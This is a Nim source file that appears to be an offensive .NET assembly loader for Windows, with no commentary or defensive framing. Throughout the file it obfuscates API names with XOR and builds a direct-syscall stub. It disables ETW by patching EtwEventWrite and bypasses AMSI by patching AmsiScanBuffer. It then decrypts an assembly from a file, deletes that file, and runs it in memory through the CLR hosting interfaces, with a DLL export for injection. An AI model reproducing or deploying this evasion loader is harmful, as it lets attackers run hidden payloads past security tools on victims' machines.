import std/[winlean, os, strutils, random, times]

proc getModuleHandleA(n: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "GetModuleHandleA".}
proc loadLibraryA(n: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "LoadLibraryA".}
proc getProcAddress(h: pointer; n: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "GetProcAddress".}
proc virtualAlloc(a: pointer; s: int; t, p: int32): pointer
  {.stdcall, dynlib: "kernel32", importc: "VirtualAlloc".}
proc virtualProtectK(a: pointer; s: int; p: int32; o: ptr int32): int32
  {.stdcall, dynlib: "kernel32", importc: "VirtualProtect".}
proc sleepMs(ms: int32)
  {.stdcall, dynlib: "kernel32", importc: "Sleep".}

const obfKey = 0x5A'u8

proc deobf(enc: openArray[uint8]): string =
  result = newString(enc.len)
  for i in 0 ..< enc.len: result[i] = char(enc[i] xor obfKey)

type
  FCorBind    = proc(ver, flav: WideCString; flags: int32;
                     clsid, iid, ppv: pointer): int32 {.stdcall.}
  FClrCreate  = proc(clsid, iid, ppv: pointer): int32 {.stdcall.}
  FSaCreate   = proc(vt: uint16; dims: uint32; bound: pointer): pointer {.stdcall.}
  FSaAccess   = proc(sa: pointer; ppData: ptr pointer): int32 {.stdcall.}
  FSaUnaccess = proc(sa: pointer): int32 {.stdcall.}
  FSaDestroy  = proc(sa: pointer): int32 {.stdcall.}
  FSaCreateV  = proc(vt: uint16; lb: int32; n: uint32): pointer {.stdcall.}
  FSaPut      = proc(sa: pointer; idx: ptr int32; pv: pointer): int32 {.stdcall.}
  FSaGetLB    = proc(sa: pointer; dim: uint32; lb: ptr int32): int32 {.stdcall.}
  FSaGetUB    = proc(sa: pointer; dim: uint32; ub: ptr int32): int32 {.stdcall.}
  FSysAlloc   = proc(s: WideCString): pointer {.stdcall.}

var
  gCorBind:    FCorBind
  gClrCreate:  FClrCreate
  gSaCreate:   FSaCreate
  gSaAccess:   FSaAccess
  gSaUnaccess: FSaUnaccess
  gSaDestroy:  FSaDestroy
  gSaCreateV:  FSaCreateV
  gSaPut:      FSaPut
  gSaGetLB:    FSaGetLB
  gSaGetUB:    FSaGetUB
  gSysAlloc:   FSysAlloc

proc loadFuncs() =
  let mcee = deobf([0x37'u8,0x29,0x39,0x35,0x28,0x3f,0x3f])
  var hMc = getModuleHandleA(mcee.cstring)
  if hMc == nil: hMc = loadLibraryA(mcee.cstring)
  if hMc != nil:
    let n1 = deobf([0x19'u8,0x35,0x28,0x18,0x33,0x34,0x3e,0x0e,0x35,0x08,0x2f,0x34,0x2e,0x33,0x37,0x3f,0x1f,0x22])
    gCorBind   = cast[FCorBind](getProcAddress(hMc, n1.cstring))
    let n2 = deobf([0x19'u8,0x16,0x08,0x19,0x28,0x3f,0x3b,0x2e,0x13,0x34,0x29,0x2e,0x3b,0x34,0x39,0x3f])
    gClrCreate = cast[FClrCreate](getProcAddress(hMc, n2.cstring))
  let oaut = deobf([0x35'u8,0x36,0x3f,0x3b,0x2f,0x2e,0x69,0x68,0x74,0x3e,0x36,0x36])
  var hOa = getModuleHandleA(oaut.cstring)
  if hOa == nil: hOa = loadLibraryA(oaut.cstring)
  if hOa != nil:
    let s1 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x19,0x28,0x3f,0x3b,0x2e,0x3f])
    let s2 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x1b,0x39,0x39,0x3f,0x29,0x29,0x1e,0x3b,0x2e,0x3b])
    let s3 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x0f,0x34,0x3b,0x39,0x39,0x3f,0x29,0x29,0x1e,0x3b,0x2e,0x3b])
    let s4 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x1e,0x3f,0x29,0x2e,0x28,0x35,0x23])
    let s5 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x0c,0x3f,0x39,0x2e,0x35,0x28])
    let s6 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x0a,0x2f,0x2e,0x1f,0x36,0x3f,0x37,0x3f,0x34,0x2e])
    let s7 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x1d,0x3f,0x2e,0x16,0x18,0x35,0x2f,0x34,0x3e])
    let s8 = deobf([0x09'u8,0x3b,0x3c,0x3f,0x1b,0x28,0x28,0x3b,0x23,0x1d,0x3f,0x2e,0x0f,0x18,0x35,0x2f,0x34,0x3e])
    let s9 = deobf([0x09'u8,0x23,0x29,0x1b,0x36,0x36,0x35,0x39,0x09,0x2e,0x28,0x33,0x34,0x3d])
    gSaCreate   = cast[FSaCreate  ](getProcAddress(hOa, s1.cstring))
    gSaAccess   = cast[FSaAccess  ](getProcAddress(hOa, s2.cstring))
    gSaUnaccess = cast[FSaUnaccess](getProcAddress(hOa, s3.cstring))
    gSaDestroy  = cast[FSaDestroy ](getProcAddress(hOa, s4.cstring))
    gSaCreateV  = cast[FSaCreateV ](getProcAddress(hOa, s5.cstring))
    gSaPut      = cast[FSaPut     ](getProcAddress(hOa, s6.cstring))
    gSaGetLB    = cast[FSaGetLB   ](getProcAddress(hOa, s7.cstring))
    gSaGetUB    = cast[FSaGetUB   ](getProcAddress(hOa, s8.cstring))
    gSysAlloc   = cast[FSysAlloc  ](getProcAddress(hOa, s9.cstring))

type
  SAFEARRAYBOUND {.pure.} = object
    cElements: uint32
    lLbound:   int32
  VARIANT {.pure.} = object
    vt:  uint16
    r1, r2, r3: uint16
    val: array[8, byte]

const
  VT_NULL:    uint16 = 1
  VT_BSTR:    uint16 = 8
  VT_ARRAY:   uint16 = 0x2000
  VT_VARIANT: uint16 = 12
  VT_UI1:     uint16 = 17

let
  CLSID_CorRuntimeHost: array[16, uint8] = [
    0x23'u8,0x67,0x2f,0xcb, 0x3a,0xab, 0xd2,0x11,
    0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e]
  IID_ICorRuntimeHost: array[16, uint8] = [
    0x22'u8,0x67,0x2f,0xcb, 0x3a,0xab, 0xd2,0x11,
    0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e]
  IID_AppDomain: array[16, uint8] = [
    0xdc'u8,0x96,0xf6,0x05, 0x29,0x2b, 0x63,0x36,
    0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13]
  CLSID_CLRMetaHost: array[16, uint8] = [
    0x8d'u8,0x18,0x80,0x92, 0x8e,0x0e, 0x67,0x48,
    0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde]
  IID_ICLRMetaHost: array[16, uint8] = [
    0x9e'u8,0xdb,0x32,0xd3, 0xb3,0xb9, 0x25,0x41,
    0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16]
  IID_ICLRRuntimeInfo: array[16, uint8] = [
    0xd2'u8,0xd1,0x39,0xbd, 0x2f,0xba, 0x6a,0x48,
    0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91]

when defined(asDll):
  template hardFail() = raise newException(Defect, "")
else:
  template hardFail() = quit(1)

proc vtbl(obj: pointer; idx: int): pointer =
  cast[ptr ptr UncheckedArray[pointer]](obj)[][idx]

proc getSyscallNum(hNtdll: pointer; name: cstring): uint32 =
  let fn = getProcAddress(hNtdll, name)
  if fn == nil: return 0
  cast[ptr uint32](cast[int](fn) + 4)[]

proc makeSyscallStub(sysNum: uint32): pointer =
  let mem = virtualAlloc(nil, 16, 0x3000'i32, 0x04'i32)
  if mem == nil: return nil
  let b = cast[ptr UncheckedArray[uint8]](mem)
  b[0] = 0x4c; b[1] = 0x8b; b[2] = 0xd1
  b[3] = 0xb8
  b[4] = uint8(sysNum and 0xff)
  b[5] = uint8((sysNum shr 8) and 0xff)
  b[6] = 0x00; b[7] = 0x00
  b[8] = 0x0f; b[9] = 0x05
  b[10] = 0xc3
  var old: int32
  discard virtualProtectK(mem, 16, 0x20'i32, addr old)
  mem

proc ntProtect(stub: pointer; base: pointer; size: int; prot: int32; old: ptr int32): bool =
  if stub != nil:
    var baseAddr = base
    var regionSize = size
    let fn = cast[proc(p: pointer; b: ptr pointer; s: ptr int;
                       np: int32; op: ptr int32): int32 {.stdcall.}](stub)
    return fn(cast[pointer](-1'i64), addr baseAddr, addr regionSize, prot, old) == 0
  virtualProtectK(base, size, prot, old) != 0

const amsiPatches: array[4, array[6, uint8]] = [
  [0xe2'u8, 0x0d, 0x5a, 0x5d, 0xda, 0x99],
  [0xe2'u8, 0x5a, 0x5a, 0x5d, 0xda, 0x99],
  [0xe2'u8, 0x5f, 0x5a, 0x5d, 0xda, 0x99],
  [0xe2'u8, 0x34, 0x5a, 0x5d, 0xda, 0x99],
]

proc initScan(stub: pointer) =
  let n1 = deobf([0x3b'u8,0x37,0x29,0x33,0x74,0x3e,0x36,0x36])
  var hAmsi = getModuleHandleA(n1.cstring)
  if hAmsi == nil: hAmsi = loadLibraryA(n1.cstring)
  if hAmsi == nil: return
  let n2 = deobf([0x1b'u8,0x37,0x29,0x33,0x09,0x39,0x3b,0x34,0x18,0x2f,0x3c,0x3c,0x3f,0x28])
  let fn = getProcAddress(hAmsi, n2.cstring)
  if fn == nil: return
  var old: int32
  if not ntProtect(stub, fn, 6, 0x40'i32, addr old): return
  var rng = initRand(cast[int](fn))
  let patch = deobf(amsiPatches[rng.rand(3)])
  copyMem(fn, unsafeAddr patch[0], 6)
  discard ntProtect(stub, fn, 6, old, addr old)

proc initTrace(stub: pointer) =
  let n1 = deobf([0x34'u8,0x2e,0x3e,0x36,0x36,0x74,0x3e,0x36,0x36])
  let hNtdll = getModuleHandleA(n1.cstring)
  if hNtdll == nil: return
  let n2 = deobf([0x1f'u8,0x2e,0x2d,0x1f,0x2c,0x3f,0x34,0x2e,0x0d,0x28,0x33,0x2e,0x3f])
  let fn = getProcAddress(hNtdll, n2.cstring)
  if fn == nil: return
  var old: int32
  discard ntProtect(stub, fn, 1, 0x40'i32, addr old)
  cast[ptr uint8](fn)[] = 0xc3
  discard ntProtect(stub, fn, 1, old, addr old)

proc u16le(s: string; o: int): uint16 =
  uint16(ord(s[o])) or (uint16(ord(s[o+1])) shl 8)

proc u32le(s: string; o: int): uint32 =
  uint32(ord(s[o])) or (uint32(ord(s[o+1])) shl 8) or
  (uint32(ord(s[o+2])) shl 16) or (uint32(ord(s[o+3])) shl 24)

proc rvaToOff(s: string; rva: uint32): int =
  let pe    = int(u32le(s, 0x3c))
  let coff  = pe + 4
  let nSec  = int(u16le(s, coff + 2))
  let optSz = int(u16le(s, coff + 16))
  let secBase = coff + 20 + optSz
  for i in 0 ..< nSec:
    let o   = secBase + i * 40
    let va  = u32le(s, o + 12)
    let vsz = u32le(s, o + 16)
    let raw = u32le(s, o + 20)
    if rva >= va and rva < va + vsz:
      return int(rva - va + raw)
  -1

proc clrRuntime(s: string): string =
  result = deobf([0x2c'u8,0x6e,0x74,0x6a,0x74,0x69,0x6a,0x69,0x6b,0x63])
  try:
    if s.len < 0x100: return
    let pe  = int(u32le(s, 0x3c))
    let opt = pe + 4 + 20
    let dd  = opt + (if u16le(s, opt) == 0x20B'u16: 112 else: 96)
    let clrRva = u32le(s, dd + 14 * 8)
    if clrRva == 0: return
    let clrOff = rvaToOff(s, clrRva)
    if clrOff < 0 or clrOff + 12 > s.len: return
    let metaRva = u32le(s, clrOff + 8)
    let metaOff = rvaToOff(s, metaRva)
    if metaOff < 0 or metaOff + 20 > s.len: return
    if s[metaOff] != 'B' or s[metaOff+1] != 'S' or
       s[metaOff+2] != 'J' or s[metaOff+3] != 'B': return
    let vLen = int(u32le(s, metaOff + 12))
    if vLen <= 0 or vLen > 64 or metaOff + 16 + vLen > s.len: return
    var ver = ""
    for i in 0 ..< vLen:
      let c = s[metaOff + 16 + i]
      if c == '\0': break
      ver.add c
    if ver.len >= 2 and ver[1] in {'1', '2', '3'}:
      result = deobf([0x2c'u8,0x68,0x74,0x6a,0x74,0x6f,0x6a,0x6d,0x68,0x6d])
  except: discard

proc fromHex(s: string): string =
  result = newString(s.len div 2)
  for i in 0 ..< result.len:
    result[i] = char(parseHexInt(s[i*2 ..< i*2+2]))

proc xorDecrypt(data, key: string): string =
  result = newString(data.len)
  for i in 0 ..< data.len:
    result[i] = char(uint8(ord(data[i])) xor uint8(ord(key[i mod key.len])))

proc initClrViaMetaHost(rtVer: string; rt: ptr pointer): bool =
  var meta: pointer
  if gClrCreate == nil or gClrCreate(unsafeAddr CLSID_CLRMetaHost,
                                     unsafeAddr IID_ICLRMetaHost, addr meta) < 0 or meta == nil:
    return false
  let getRtFn = cast[proc(this: pointer; ver: WideCString;
                          riid, ppv: pointer): int32 {.stdcall.}](vtbl(meta, 3))
  var rtInfo: pointer
  if getRtFn(meta, newWideCString(rtVer),
             unsafeAddr IID_ICLRRuntimeInfo, addr rtInfo) < 0 or rtInfo == nil:
    return false
  let getIfFn = cast[proc(this: pointer; clsid, iid,
                          ppv: pointer): int32 {.stdcall.}](vtbl(rtInfo, 9))
  if getIfFn(rtInfo, unsafeAddr CLSID_CorRuntimeHost,
             unsafeAddr IID_ICorRuntimeHost, rt) < 0 or rt[] == nil:
    return false
  true

proc runAssembly(keyHex, blobPath: string; asmArgs: seq[string]) =
  loadFuncs()

  var encBytes: string
  for _ in 0 ..< 20:
    try:
      encBytes = readFile(blobPath)
      if encBytes.len > 0: break
    except CatchableError: discard
    sleepMs(300)
  if encBytes.len == 0: hardFail()
  try: removeFile(blobPath) except CatchableError: discard

  let key      = fromHex(keyHex)
  let asmBytes = xorDecrypt(encBytes, key)

  let n1 = deobf([0x34'u8,0x2e,0x3e,0x36,0x36,0x74,0x3e,0x36,0x36])
  let hNtdll = getModuleHandleA(n1.cstring)
  let ntpvm = deobf([0x14'u8,0x2e,0x0a,0x28,0x35,0x2e,0x3f,0x39,0x2e,
                     0x0c,0x33,0x28,0x2e,0x2f,0x3b,0x36,0x17,0x3f,0x37,0x35,0x28,0x23])
  let sysNum = if hNtdll != nil: getSyscallNum(hNtdll, ntpvm.cstring) else: 0'u32
  let stub   = if sysNum > 0: makeSyscallStub(sysNum) else: nil

  initTrace(stub)

  let rtVer = clrRuntime(asmBytes)
  var rt: pointer

  var rng = initRand(int(epochTime() * 1e6))
  let useMetaHost = rng.rand(1) == 0

  if useMetaHost:
    discard initClrViaMetaHost(rtVer, addr rt)
  if rt == nil:
    if gCorBind == nil: hardFail()
    let hr = gCorBind(newWideCString(rtVer), nil, 0,
      unsafeAddr CLSID_CorRuntimeHost,
      unsafeAddr IID_ICorRuntimeHost,
      addr rt)
    if hr < 0 or rt == nil: hardFail()

  let startFn = cast[proc(this: pointer): int32 {.stdcall.}](vtbl(rt, 10))
  if startFn(rt) < 0: hardFail()

  initScan(stub)

  var unk: pointer
  let getDomFn = cast[proc(this: pointer; pp: ptr pointer): int32 {.stdcall.}](vtbl(rt, 13))
  if getDomFn(rt, addr unk) < 0 or unk == nil: hardFail()

  var ad: pointer
  let qiFn = cast[proc(this: pointer; riid: pointer; ppv: ptr pointer): int32 {.stdcall.}](vtbl(unk, 0))
  if qiFn(unk, unsafeAddr IID_AppDomain, addr ad) < 0 or ad == nil: hardFail()

  if gSaCreate == nil or gSaAccess == nil or gSaUnaccess == nil or
     gSaDestroy == nil or gSaCreateV == nil or gSaPut == nil or
     gSaGetLB == nil or gSaGetUB == nil or gSysAlloc == nil: hardFail()

  var sab: SAFEARRAYBOUND
  sab.cElements = uint32(asmBytes.len)
  sab.lLbound   = 0
  let sa = gSaCreate(VT_UI1, 1, addr sab)
  if sa == nil: hardFail()

  var pvData: pointer
  discard gSaAccess(sa, addr pvData)
  copyMem(pvData, unsafeAddr asmBytes[0], asmBytes.len)
  discard gSaUnaccess(sa)

  var assembly: pointer
  let load3Fn = cast[proc(this: pointer; sa: pointer; pp: ptr pointer): int32 {.stdcall.}](vtbl(ad, 45))
  if load3Fn(ad, sa, addr assembly) < 0 or assembly == nil:
    discard gSaDestroy(sa)
    hardFail()
  discard gSaDestroy(sa)

  var mi: pointer
  let epFn = cast[proc(this: pointer; pp: ptr pointer): int32 {.stdcall.}](vtbl(assembly, 16))
  if epFn(assembly, addr mi) < 0 or mi == nil: hardFail()

  var paramsSa: pointer
  let getpFn = cast[proc(this: pointer; pp: ptr pointer): int32 {.stdcall.}](vtbl(mi, 18))
  discard getpFn(mi, addr paramsSa)

  var lb, ub: int32
  var argsSa: pointer
  if paramsSa != nil:
    discard gSaGetLB(paramsSa, 1, addr lb)
    discard gSaGetUB(paramsSa, 1, addr ub)
    let cnt = ub - lb + 1
    if cnt > 0:
      let bstrSa = gSaCreateV(VT_BSTR, 0, uint32(max(1, asmArgs.len)))
      if bstrSa != nil:
        if asmArgs.len > 0:
          for i in 0 ..< asmArgs.len:
            let ws = newWideCString(asmArgs[i])
            let bs = gSysAlloc(ws)
            var idx = int32(i)
            discard gSaPut(bstrSa, addr idx, bs)
        else:
          let ws = newWideCString("")
          let bs = gSysAlloc(ws)
          var idx: int32 = 0
          discard gSaPut(bstrSa, addr idx, bs)
        argsSa = gSaCreateV(VT_VARIANT, 0, 1)
        if argsSa != nil:
          var vtPsa: VARIANT
          vtPsa.vt = VT_ARRAY or VT_BSTR
          cast[ptr pointer](addr vtPsa.val)[] = bstrSa
          var idx: int32 = 0
          discard gSaPut(argsSa, addr idx, addr vtPsa)

  var v1, v2: VARIANT
  v1.vt = VT_NULL
  let inv3Fn = cast[proc(this: pointer; obj: ptr VARIANT; sa: pointer;
                         ret: ptr VARIANT): int32 {.stdcall.}](vtbl(mi, 37))
  discard inv3Fn(mi, addr v1, argsSa, addr v2)

when defined(asDll):
  type RunArgs {.pure.} = object
    keyHex:    array[256, char]
    blobPath:  array[520, char]
    argsBuf:   array[8192, char]
    argsCount: int32

  proc NimuxRun(p: pointer): int32 {.exportc, stdcall, dynlib.} =
    if p == nil: return 1
    let a  = cast[ptr RunArgs](p)
    let kh = $cast[cstring](unsafeAddr a.keyHex[0])
    let bp = $cast[cstring](unsafeAddr a.blobPath[0])
    var args: seq[string]
    var pos = 0
    for _ in 0 ..< a.argsCount:
      if pos >= a.argsBuf.len: break
      let s = $cast[cstring](unsafeAddr a.argsBuf[pos])
      args.add s
      pos += s.len + 1
    try: runAssembly(kh, bp, args)
    except: discard
    0

when isMainModule:
  if paramCount() < 2: quit(1)
  let keyHex   = paramStr(1)
  let blobPath = paramStr(2)
  var asmArgs: seq[string]
  for i in 3 .. paramCount(): asmArgs.add paramStr(i)
  runAssembly(keyHex, blobPath, asmArgs)
